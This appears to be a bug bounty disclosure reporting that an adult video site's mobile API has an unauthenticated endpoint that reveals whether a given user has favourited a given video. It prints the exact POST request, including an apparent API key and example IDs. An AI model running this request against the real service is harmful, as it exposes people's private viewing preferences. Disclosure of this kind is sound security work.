Summary:

Hi, 

While testing the mobile API, I came across an issue which allows anyone to check whether a specific video has been favourited by a user or not.  The mobile API has the following endpoint which checks whether a video has been favourited or not. However the endpoint is unauthenticated and it is possible to do this for any user based on the numeric `user_id`.

*Endpoint:* `/app/videos/favorites/check`

The following POST request can be used to check whether a video has been favourited by a user or not: 

```
POST /api/mobile/duug3daeThooshauth5SheoRei6xarah/app/videos/favorites/check/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Host: www.youporn.com
Connection: close
Accept-Encoding: gzip
User-Agent: okhttp/2.2.0

video_id=<video-id>&user_id=<user-id>
``` 

*Example:*

```
POST /api/mobile/duug3daeThooshauth5SheoRei6xarah/app/videos/favorites/check/ HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Host: www.youporn.com
Connection: close
Accept-Encoding: gzip
User-Agent: okhttp/2.2.0

video_id=646817&user_id=8182721
```


If the video is favourited by the user then response is `{"success":true}` otherwise if not favourited then the response is `{"success":false}`

Thanks!
